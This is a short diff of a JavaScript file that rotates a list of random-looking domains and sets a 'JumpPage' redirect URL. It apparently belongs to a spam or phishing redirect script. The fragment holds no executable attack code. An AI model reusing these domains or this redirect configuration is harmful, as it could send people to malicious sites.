@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
+	'pkebojeci.com/', 
 	'wroedeod.com/', 
-	'unwmrabml.cc/', 
-    'qzmiltciy.com/',
+    'unwmrabml.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://zuzqlpuf.cc";
